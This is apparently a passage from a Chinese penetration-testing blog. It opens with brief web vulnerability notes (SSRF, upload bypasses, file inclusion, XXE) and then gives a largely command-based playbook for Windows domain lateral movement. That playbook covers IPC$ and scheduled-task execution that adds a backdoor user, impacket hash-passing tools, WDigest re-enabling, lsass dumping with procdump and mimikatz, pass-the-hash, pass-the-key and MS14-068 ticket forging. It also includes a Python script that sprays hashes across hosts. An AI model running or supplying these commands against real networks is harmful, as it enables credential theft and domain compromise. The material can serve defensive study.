<h2 id="4-ssrf（服务端请求伪造攻击）"><a href="#4-ssrf（服务端请求伪造攻击）" class="headerlink" title="4.ssrf（服务端请求伪造攻击）"></a>4.ssrf（服务端请求伪造攻击）</h2><h3 id="ssrf原理"><a href="#ssrf原理" class="headerlink" title="ssrf原理"></a>ssrf原理</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击者在访问A时，利用A的特定功能构造特殊payload，由A发起对内部网络中系统B（内网隔离，外部不可访问）的请求，从而获取敏感信息。</span><br><span class="line"></span><br><span class="line">1- 服务器允许向其他服务器获取资源</span><br><span class="line">2- 但是并没有对该地址做严格的过滤和限制</span><br><span class="line">3- 所以导致了攻击者可以向受害者服务器，传入任意的URL 地址，并将数据返回</span><br></pre></td></tr></table></figure>

<h3 id="ssrf原因"><a href="#ssrf原因" class="headerlink" title="ssrf原因"></a>ssrf原因</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file_get_contents()、fsockopen()、curl_exec()这三个函数运用不当。</span><br></pre></td></tr></table></figure>

<h3 id="ssrf位置"><a href="#ssrf位置" class="headerlink" title="ssrf位置"></a>ssrf位置</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.分享：通过URL地址分享网页内容</span><br><span class="line">2.转码服务</span><br><span class="line">3.在线翻译</span><br><span class="line">4.图片加载与下载：通过URL地址加载或下载图片</span><br><span class="line">5.图片、文章收藏功能</span><br><span class="line">6.未公开的api实现以及其他调用URL的功能</span><br><span class="line">7.从URL关键字中寻找</span><br></pre></td></tr></table></figure>

<h3 id="ssrf防护"><a href="#ssrf防护" class="headerlink" title="ssrf防护"></a>ssrf防护</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">禁止302跳转、限制协议只保留HTTP、HTTPS，防止file://、gopher://和ftp://、内外网限制、URL限制</span><br><span class="line">地址做白名单</span><br></pre></td></tr></table></figure>

<h3 id="csrf和ssrf区别"><a href="#csrf和ssrf区别" class="headerlink" title="csrf和ssrf区别"></a>csrf和ssrf区别</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">csrf是服务器端对对用户的数据像cookie信息等重要数据没有做严格把控，使得攻击者窃取信息进行伪造发送给服务器</span><br><span class="line">ssrf是服务器对用户提供的url地址过于信任，没有检测，导致攻击者可以通过这个跳板攻击内网。</span><br></pre></td></tr></table></figure>

<h2 id="5-文件上传"><a href="#5-文件上传" class="headerlink" title="5.文件上传"></a>5.文件上传</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。</span><br></pre></td></tr></table></figure>

<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MIME类型检测：HTTP请求字段里的Content-Type字段改为image/jpeg；image/png；image/gif</span><br><span class="line">黑名单绕过：php3、php4、大小写</span><br><span class="line">.htaccess绕过：1.mod_rewrite模块开启。2.AllowOverride All，该目录的文件按php来解析执行</span><br><span class="line">&lt;FilesMatch &quot;shana&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line">::$DATA绕过：会把这个后面的后缀名当成文件流处理。</span><br><span class="line">点、空格、大小写、双写绕过</span><br><span class="line">图片马绕过：绕过getimagesize()方法、exif_imagetype()需要开启php的配置文件中的php_exif模块。</span><br><span class="line">二次渲染：文件上传后经过二次渲染重新生成图片容易把图片里的php代码改掉，把图片里的php代码放到前面</span><br><span class="line">条件竞争：不断上传，不断访问。</span><br><span class="line">%00截断：：php版本小于5.3.4，php的magic_quotes_gpc为OFF状态</span><br></pre></td></tr></table></figure>

<h2 id="6-文件包含"><a href="#6-文件包含" class="headerlink" title="6.文件包含"></a>6.文件包含</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在网站的开发人员在开发网站的时候，会把经常重复使用的函数或者特定的页面写到单个文件中，需要使用的时候就直接调用此文件即可，而无需再次浪费时间再次编写，这种操作通常被称为文件包含。</span><br></pre></td></tr></table></figure>

<h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include()：包含并运行指定的文件，包含文件发生错误时，程序警告，但会继续执行。</span><br><span class="line">require()：包含并运行指定的文件，包含文件发生错误时，程序直接终止执行。</span><br><span class="line">include_once()：和 include 类似，不同处在于 include_once 会检查这个文件是否已经被导入，如果已导入，下文便不会再导入，直面 once 理解就是只导入一次。</span><br><span class="line">require_once()：和 require 类似，不同处在于 require_once 只导入一次。</span><br></pre></td></tr></table></figure>

<h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.本地文件包含</span><br><span class="line">2.远程文件包含需要php.ini开启了allow_url_fopen默认开启和allow_url_include默认关闭</span><br></pre></td></tr></table></figure>

<h3 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.php://input</span><br><span class="line">2.php://filter</span><br></pre></td></tr></table></figure>

<h3 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.检查服务器配置文件</span><br><span class="line">2.过滤特殊符号 ，\/input output filter</span><br></pre></td></tr></table></figure>

<h2 id="XXE（外部实体注入）"><a href="#XXE（外部实体注入）" class="headerlink" title="XXE（外部实体注入）"></a>XXE（外部实体注入）</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当包含对外部实体的引用的 XML 输入被弱配置的 XML 解析器处理时，就会发生这种攻击。这种攻击可能导致机密数据泄露、拒绝服务、服务器端请求伪造、从解析器所在机器的角度进行端口扫描，以及其他系统影响。</span><br><span class="line"></span><br><span class="line">XML很像html语言，但标签需要自己来定义。</span><br><span class="line">XML用于传输和数据存储。HTML用于显示数据。</span><br></pre></td></tr></table></figure>

<h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.DOS攻击</span><br><span class="line">2.文件读取</span><br><span class="line">3.内网探测</span><br></pre></td></tr></table></figure>

<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.使用开发语言提供的禁用外部实体的方法</span><br><span class="line">PHP：</span><br><span class="line">libxml_disable_entity_loader(true);</span><br><span class="line">JAVA:</span><br><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br><span class="line">Python：</span><br><span class="line">from lxml import etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</span><br><span class="line">2.过滤和验证用户提交的XML数据</span><br><span class="line">3.过滤关键词&lt;!DOCTYPE、&lt;!ENTITY SYSTEM、PUBLIC</span><br><span class="line">4.不允许XML中含有任何自己声明的DTD</span><br></pre></td></tr></table></figure>

<h2 id="业务逻辑漏洞"><a href="#业务逻辑漏洞" class="headerlink" title="业务逻辑漏洞"></a>业务逻辑漏洞</h2><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.身份验证漏洞</span><br><span class="line">暴力破解</span><br><span class="line">Session固定攻击</span><br><span class="line">Cookie欺骗漏洞</span><br><span class="line">2.权限类逻辑漏洞</span><br><span class="line">水平越权</span><br><span class="line">垂直越权</span><br><span class="line">未授权访问</span><br><span class="line">3.图形验证码漏洞</span><br><span class="line">4.找回密码逻辑洞</span><br><span class="line">5.业务逻辑篡改漏洞</span><br><span class="line">6.执行顺序篡改漏洞</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>web渗透基础</tag>
      </tags>
  </entry>
  <entry>
    <title>域内横向移动分析及防御</title>
    <url>/2022/02/24/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90%E5%8F%8A%E9%98%B2%E5%BE%A1/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="域横向批量at-amp-schtasks-amp-impacket"><a href="#域横向批量at-amp-schtasks-amp-impacket" class="headerlink" title="域横向批量at&amp;schtasks&amp;impacket"></a>域横向批量at&amp;schtasks&amp;impacket</h1><h2 id="横向渗透明文传递-at-amp-schtasks"><a href="#横向渗透明文传递-at-amp-schtasks" class="headerlink" title="横向渗透明文传递 at&amp;schtasks"></a>横向渗透明文传递 at&amp;schtasks</h2><p>at&amp;schtasks命令，已知目标系统的用户明文密码的基础上，直接可以在远程主机上执行命令。<br>获取到某域的主机权限-&gt;minikatz 得到密码（明文，hash）-&gt;用信息搜集里面的域用户的列表当作用户名字典-&gt;用到密码明文当作密码字典-&gt;尝试连接-&gt;创建计划任务-&gt;执行文件可为后门或者相关命令</p>
<p>利用流程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.建立IPC连接到目标主机(ipc通过验证用户名密码，获得相应的权限，通常在远程管理计算机和查看计算机的共享资源时使用)</span><br><span class="line">	利用条件：（1）开启139、445端口（2）管理员开启了默认共享</span><br><span class="line">2.拷贝要执行的命令脚本到目标主机</span><br><span class="line">3.查看目标时间，创建计划任务（at、schtasks）定时执行拷贝到的脚本</span><br><span class="line">4.删除ipc连接</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 工作组</span><br><span class="line">net use \\server\ipc$&quot;password&quot; /user:username</span><br><span class="line">#域内</span><br><span class="line">net use \\server\ipc$&quot;password&quot; /user:domain\username</span><br><span class="line"># 查看文件列表</span><br><span class="line">dir \\xx.xx.xx.xx\C$\</span><br><span class="line"># 下载文件</span><br><span class="line">copy \\xx.xx.xx.xx\C$\1.bat 1.bat</span><br><span class="line"># 复制文件</span><br><span class="line">copy 1.bat \\xx.xx.xx.xx\C$</span><br><span class="line"># 删除 IPC</span><br><span class="line">net use \\xx.xx.xx.xx\C$\1.bat /del</span><br><span class="line"># 查看对方共享</span><br><span class="line">net view xx.xx.xx.xx</span><br></pre></td></tr></table></figure>





<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">at &lt; Windows2012</span><br><span class="line"># 建立 ipc 连接：</span><br><span class="line">	net use \\192.168.3.21\ipc$ &quot;Admin12345&quot; /user:god.org\ad ministrator</span><br><span class="line"># 拷贝执行文件到目标机器</span><br><span class="line">	copy add.bat \\192.168.3.21\c$</span><br><span class="line"># add.bat </span><br><span class="line">	net user xiaodi qwe123!@#X. /add</span><br><span class="line">#添加计划任务</span><br><span class="line">	at \\192.168.3.21 15:47 c:\add.bat </span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">schtasks &gt;=Windows2012</span><br><span class="line"># 建立 ipc 连接：</span><br><span class="line">net use \\192.168.3.32\ipc$ &quot;admin!@#45&quot; /user:god.org\administrator //不行把god.org\删除</span><br><span class="line"># 复制文件到其 C 盘</span><br><span class="line">copy add.bat \\192.168.3.32\c$ </span><br><span class="line"># 创建 adduser 任务 对应执行文件</span><br><span class="line">schtasks /create /s 192.168.3.32 /ru &quot;SYSTEM&quot; /tn adduser /sc DAILY /tr c:\add.bat /F </span><br><span class="line"># 运行 adduser 任务</span><br><span class="line">schtasks /run /s 192.168.3.32 /tn adduser /i</span><br><span class="line"># 删除 adduser 任务</span><br><span class="line">schtasks /delete /s 192.168.3.21 /tn adduser /f</span><br></pre></td></tr></table></figure>



<h2 id="横向渗透明文HASH传递atexec-impacket"><a href="#横向渗透明文HASH传递atexec-impacket" class="headerlink" title="横向渗透明文HASH传递atexec-impacket"></a>横向渗透明文HASH传递atexec-impacket</h2><p>通过用impacket网络协议工具包的atexec.exe的命令来进行攻击，需要免杀，第三方工具。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">atexec.exe ./administrator:Admin12345@192.168.3.21 &quot;whoami&quot; （本地的）</span><br><span class="line">atexec.exe god/administrator:Admin12345@192.168.3.21 &quot;whoami&quot; （域用户）</span><br><span class="line">atexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 ./administrator@192.168.3.21 &quot;whoami&quot;</span><br></pre></td></tr></table></figure>



<h2 id="横向渗透明文HASH传递批量利用-综合"><a href="#横向渗透明文HASH传递批量利用-综合" class="headerlink" title="横向渗透明文HASH传递批量利用-综合"></a>横向渗透明文HASH传递批量利用-综合</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#批量检测 IP 对应明文连接</span><br><span class="line">FOR /F %%i in (ips.txt) do net use \\%%i\ipc$ &quot;admin!@#45&quot; /user:administrator</span><br><span class="line">#批量检测 IP 对应明文 回显版</span><br><span class="line">FOR /F %%i in (ips.txt) do atexec.exe ./administrator:admin!@#45@%%i whoami</span><br><span class="line">#批量检测明文对应 IP 回显版</span><br><span class="line">FOR /F %%i in (pass.txt) do atexec.exe ./administrator:%%i@192.168.3.21 whoami</span><br><span class="line"># 批量检测 HASH 对应 IP 回显版</span><br><span class="line">FOR /F %%i in (hash.txt) do atexec.exe -hashes :%%i ./administrator@192.168.3.21 whoami</span><br></pre></td></tr></table></figure>



<h2 id="横向渗透明文HASH传递批量利用-升级版"><a href="#横向渗透明文HASH传递批量利用-升级版" class="headerlink" title="横向渗透明文HASH传递批量利用-升级版"></a>横向渗透明文HASH传递批量利用-升级版</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install pyinstaller（将.py文件生成为.exe文件）</span><br><span class="line">pyinstaller -F fuck_neiwang_001.py（生成.exe文件）</span><br></pre></td></tr></table></figure>



<h1 id="域横向smb-amp-wmi明文或hash传递"><a href="#域横向smb-amp-wmi明文或hash传递" class="headerlink" title="域横向smb&amp;wmi明文或hash传递"></a>域横向smb&amp;wmi明文或hash传递</h1><h2 id="知识补充"><a href="#知识补充" class="headerlink" title="知识补充"></a>知识补充</h2><p>windows2012以上版本默认关闭wdigest，攻击者无法从内存中获取明文密码<br>windows2012以下版本如安装KB2871997补丁，同样也会导致无法获取明文密码</p>
<p>针对以上情况，有4种方案解决问题<br>    1.利用hash传递（pth、ptk等）进行移动<br>    2.利用其它服务协议（SMB、WMI等）哈希移动<br>    （以上是无法获取明文的方法，以下是获取明文的方法）<br>    3.利用注册表操作开启Wdigest Auth值进行获取<br>    4.利用工具或第三方平台（Hachcat）进行破解获取（看自己字典了）</p>
<p>windows系统LM Hash及NTLM Hash加密算法，个人系统在windows vista后，服务器系统在 windows 2003以后，认证方式均为NTLM Hash。</p>
<p>注册表修改（当目标为win10或2012R2以上时默认在内存缓存中禁止保存明文密码但可以通过修改注册表的方式抓取明文）<br>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f<br>#重启或用户重新登录后可以成功抓取</p>
<h2 id="Procdump-Mimikatz配合获取"><a href="#Procdump-Mimikatz配合获取" class="headerlink" title="Procdump+Mimikatz配合获取"></a>Procdump+Mimikatz配合获取</h2><p>使用背景：<br>如果上传minikaze被杀，可以使用这个方法，因为procdump是windows官方的软件<br>1.将procdump上传到对面服务器，运行procdump，在当前目录下生成lsass.dmp文件<br>    procdump.exe -accepteula -ma lsass.exe lsass.dmp<br>2.本地minikaze还原lsass.dmp文件<br>    privilege::debug（权限提升）<br>    sekurlas::minidump lsass.dmp（载入文件）<br>    sekurlas::logonPasswords full（读取密码）</p>
<h2 id="Hashcat破解获取windows-NTML-Hash"><a href="#Hashcat破解获取windows-NTML-Hash" class="headerlink" title="Hashcat破解获取windows NTML Hash"></a>Hashcat破解获取windows NTML Hash</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat -a0  -m 1000 hash file --force</span><br></pre></td></tr></table></figure>



<h2 id="域横向移动SMB服务利用-psexec-smbexec-官方自带"><a href="#域横向移动SMB服务利用-psexec-smbexec-官方自带" class="headerlink" title="域横向移动SMB服务利用-psexec,smbexec(官方自带)"></a>域横向移动SMB服务利用-psexec,smbexec(官方自带)</h2><p>利用SMB服务可以通过明文或hash传递来远程执行，条件445端口开放</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">psexec第一种：先有ipc链接，psexec需要明文或hash传递</span><br><span class="line">	net use \\192.168.3.32\ipc$ &quot;admin!@#45&quot; /user:administrator</span><br><span class="line">	# 需要先有 ipc 链接 -s 以 System 权限运行</span><br><span class="line">	psexec \\192.168.3.32 -s cmd </span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">psexec第二种：不用建立ipc直接提供明文账号密码</span><br><span class="line">psexec \\192.168.3.21 -u administrator -p Admin12345 -s cmd</span><br><span class="line"># 官方 Pstools 无法 采用 hash 连接</span><br><span class="line"># 非官方自带-参考 impacket 工具包使用，操作简单，容易被杀</span><br><span class="line">psexec -hashes :$HASH$ ./administrator@10.1.2.3</span><br><span class="line">psexec -hashes :$HASH$ domain/administrator@10.1.2.3</span><br><span class="line">psexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 </span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbexec 无需建立ipc链接 明文或hash传递（第三方库）</span><br><span class="line">smbexec god/administrator:Admin12345@192.168.3.21（域用户）</span><br><span class="line">smbexec ./administrator:admin!@#45@192.168.3.32（本地用户）</span><br><span class="line">smbexec -hashes :$HASH$ ./admin@192.168.3.21</span><br><span class="line">smbbexec -hashes :$HASH$ domain/admin@192.168.3.21</span><br><span class="line">smbexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32</span><br><span class="line">smbexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21</span><br></pre></td></tr></table></figure>



<h2 id="域横向移动WMI服务利用-cscript-wmiexec-wmic"><a href="#域横向移动WMI服务利用-cscript-wmiexec-wmic" class="headerlink" title="域横向移动WMI服务利用-cscript,wmiexec,wmic"></a>域横向移动WMI服务利用-cscript,wmiexec,wmic</h2><p>WMI(windows Management Instrumentation)时通过135端口进行利用,支持用户名明文或者hash的方式进行认证,并且该方法不会在目标日志系统留下痕迹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#自带WMIC 明文传递 无回显(缺点,功能比较尴尬)</span><br><span class="line">wmic /node:192.168.3.21 /user:administrator /password:Admin12345 process call create &quot;cmd.exe /c ipconfig &gt;C:\1.txt&quot;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#自带cscript 明文传递，有回显，需要配合wmiexec.vbs</span><br><span class="line">cscript //nologo wmiexec.vbs /shell 192.168.3.21 administrator Admin12345</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">套件impacket wmiexec 明文或hash传递 有回显exe版本</span><br><span class="line">wmiexec ./administrator:admin!@#45@192.168.3.32 &quot;whoami&quot;</span><br><span class="line">wmiexec god/administrator:Admin12345@192.168.3.21 &quot;whoami&quot;</span><br><span class="line">wmiexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 &quot;whoami&quot;</span><br><span class="line">wmiexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21 &quot;whoami&quot;</span><br></pre></td></tr></table></figure>



<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220322123656870-1648900544415.png" alt="image-20220322123656870"></p>
<p>PTH,PTT,PTK支持hash，不需要考虑免杀。</p>
<h2 id="域横向移动以上服务hash-批量利用-python-编译exe"><a href="#域横向移动以上服务hash-批量利用-python-编译exe" class="headerlink" title="域横向移动以上服务hash 批量利用-python 编译exe"></a>域横向移动以上服务hash 批量利用-python 编译exe</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os,time</span><br><span class="line">ips=&#123;</span><br><span class="line">    <span class="string">&#x27;192.168.3.21&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.25&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.29&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.30&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.32&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">users=&#123;</span><br><span class="line">    <span class="string">&#x27;Administrator&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;boss&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;dbadmin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;fileadmin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mack&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mary&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;webadmin&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">hashs=&#123;</span><br><span class="line">    <span class="string">&#x27;ccef208c6485269c20db2cad21734fe7&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;518b98ad4178a53695dc997aa02d455c&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">    <span class="keyword">for</span> user <span class="keyword">in</span> users:</span><br><span class="line">        <span class="keyword">for</span> mimahash <span class="keyword">in</span> hashs:</span><br><span class="line">            <span class="comment">#wmiexec -hashes :hashgod/user@ipwhoami</span></span><br><span class="line">            <span class="built_in">exec</span> = <span class="string">&quot;wmiexec -hashes :&quot;</span>+mimahash+<span class="string">&quot; god/&quot;</span>+user+<span class="string">&quot;@&quot;</span>+ip+<span class="string">&quot; whoami&quot;</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;---&gt;&#x27;</span> + <span class="built_in">exec</span> + <span class="string">&#x27;&lt;---&#x27;</span>)</span><br><span class="line">            os.system(<span class="built_in">exec</span>)</span><br><span class="line">            time.sleep(<span class="number">0.5</span>) </span><br><span class="line">            exec1 = <span class="string">&quot;wmiexec -hashes :&quot;</span>+mimahash+<span class="string">&quot; god/&quot;</span>+user+<span class="string">&quot;@&quot;</span>+ip+<span class="string">&quot; whoami&quot;</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;---&gt;&#x27;</span> + exec1 + <span class="string">&#x27;&lt;---&#x27;</span>)</span><br><span class="line">            os.system(exec1)</span><br><span class="line">            time.sleep(<span class="number">0.5</span>)</span><br></pre></td></tr></table></figure>



<h1 id="域横向PTH-amp-PTK-amp-PTT哈希票据传递"><a href="#域横向PTH-amp-PTK-amp-PTT哈希票据传递" class="headerlink" title="域横向PTH&amp;PTK&amp;PTT哈希票据传递"></a>域横向PTH&amp;PTK&amp;PTT哈希票据传递</h1><p>Kerberos协议具体工作方法，在域中，简要介绍一下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">客户机将明文密码进行NTLM哈希,然后和时间戳一起加密(使用krbtgt密码 hash作为密钥)，发送给kdc(域控)，kdc对用户进行检测，成功之后创建TGT(Ticket-Granting Ticket)</span><br><span class="line"></span><br><span class="line">将TGT进行加密签名返回给客户机器，只有域用户krbtgt才能读取kerberos中TGT数据</span><br><span class="line"></span><br><span class="line">然后客户机将TGT发送给域控制器KDC请求TGS(票证授权服务）票证，并且对TGT进行检测</span><br><span class="line"></span><br><span class="line">检测成功之后，将目标服务账户的NTLM以及TGT进行加密，将加密后的结果返回给客户机</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">概念</span><br><span class="line">PTH(pass the hash)#利用LM或NTLM的值进行的渗透测试</span><br><span class="line">PTT(pass the ticket)#利用的票据凭证TGT进行的渗透测试</span><br><span class="line">PTK(pass the key)#利用的ekeys aes256进行的渗透测试</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PTH和PTK</span><br><span class="line">PTH在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接通过LM Hash和NTLM Hash访问远程主机或服务，而不用提供明文密码。</span><br><span class="line"></span><br><span class="line">如果禁用了ntlm认证，PsExec无法利用获得的ntlm hash进行远程连接，但是使用mimikatz还是可以攻击成功。对于8.1/2012r2，安装补丁kb2871997的 Win 7/2008r2/8/2012等，可以使用AES keys代替NT hash 来实现ptk攻击。</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># mimikatz</span><br><span class="line">privilege::debug        </span><br><span class="line"># NTLM</span><br><span class="line">sekurlsa::logonPasswords      </span><br><span class="line"># AES</span><br><span class="line">sekurlsa::ekeys</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">总结：KB2871997补丁后的影响</span><br><span class="line">https://www.freebuf.com/column/220740.html</span><br><span class="line">PTH:打补丁前任意用户都可以连接，打了补丁后只能administrator 用户才可以连接</span><br><span class="line">PTK:打补丁前不能连接，打补丁后才能任意用户都可以连接(采用aes256连接)</span><br></pre></td></tr></table></figure>



<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/1631613860069-8e221a7f-cc0e-42a1-bca6-f539628e6ade.png" alt="image.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PTT</span><br><span class="line">PTT攻击的部分就不是简单的NTLM认证了，它是利用Kerberos 协议进行攻击的，这里就介绍三种常见的攻击方法:MS14-068，Golden ticket，SILVER ticket。简单来说就是将连接合法的票据注入到内存中实现连接。</span><br><span class="line"></span><br><span class="line">Golden ticket(黄金票据)，SILVER ticket(白银票据)属于权限维持技术</span><br><span class="line"></span><br><span class="line">MS14-068基于漏洞，造成的危害是允许域内任何一个普通用户，将自己提升至域管权限。微软给出的补丁是kb3011780</span><br></pre></td></tr></table></figure>



<h2 id="域横向移动PTH传递-mimikatz"><a href="#域横向移动PTH传递-mimikatz" class="headerlink" title="域横向移动PTH传递-mimikatz"></a>域横向移动PTH传递-mimikatz</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PTH-ntlm传递</span><br><span class="line">mimikatz</span><br><span class="line">（提升权限） privilege::debug</span><br><span class="line">（获取ntml） sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">未打补丁下的工作组及域连接：</span><br><span class="line">（域内用户）sekurlsa::pth /user:administrator /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7 </span><br><span class="line">（本地用户）sekurlsa::pth /user:administrator /domain:workgroup /ntlm:518b98ad4178a53695dc997aa02d455c</span><br><span class="line">sekurlsa::pth /user:boss /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">弹出cmd窗口</span><br><span class="line">net use \\192.168.3.21\c$</span><br><span class="line">dir \\192.168.3.21\c$</span><br></pre></td></tr></table></figure>



<h2 id="域横向移动PTK传递-mimikatz"><a href="#域横向移动PTK传递-mimikatz" class="headerlink" title="域横向移动PTK传递-mimikatz"></a>域横向移动PTK传递-mimikatz</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">打补丁后的工作组或域的连接</span><br><span class="line">sekurlsa::pth /user:mary /domain:god /aes256:d7c1d9310753a2f7f240e5b2701dc1e6177d16a6e40af3c5cdff814719821c4b</span><br></pre></td></tr></table></figure>



<h2 id="域横向移动PTT传递-ms14068-amp-kekeo-amp-本地"><a href="#域横向移动PTT传递-ms14068-amp-kekeo-amp-本地" class="headerlink" title="域横向移动PTT传递-ms14068 &amp;kekeo&amp;本地"></a>域横向移动PTT传递-ms14068 &amp;kekeo&amp;本地</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一种利用漏洞:能实现普通用户直接获取域控system权限</span><br><span class="line">MS14-068 powershell执行</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查看当前 sid </span><br><span class="line">whoami/user</span><br><span class="line"># 查看凭证列表</span><br><span class="line">klist </span><br><span class="line"># 查看当前机器凭证</span><br><span class="line">kerberos::list</span><br><span class="line"># mimikatz 清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造</span><br><span class="line">kerberos::purge</span><br><span class="line"># 删除所有凭证</span><br><span class="line">klist purge</span><br><span class="line"># 利用 ms14-068 生成 TGT 数据</span><br><span class="line">MS14-068.exe -u 域成员名@域名 -s sid -d 域控制器地址 -p 域成员密码</span><br><span class="line">MS14-068.exe -u mary@god.org -s S-1-5-21-1218902331 -2157346161-1782232778-1124 -d 192.168.3.21 -p admin!@#45</span><br><span class="line"># 将票据注入到内存中</span><br><span class="line">kerberos::ptc 票据文件</span><br><span class="line">mimikatz.exe &quot;kerberos::ptc TGT_mary@god.org.ccache&quot; exit</span><br><span class="line"># 查看域名</span><br><span class="line">net time /domain</span><br><span class="line"># 利用</span><br><span class="line">dir \\OWA20210CN-God.god.org\c$</span><br></pre></td></tr></table></figure>



<p>第二种利用工具kekeo</p>
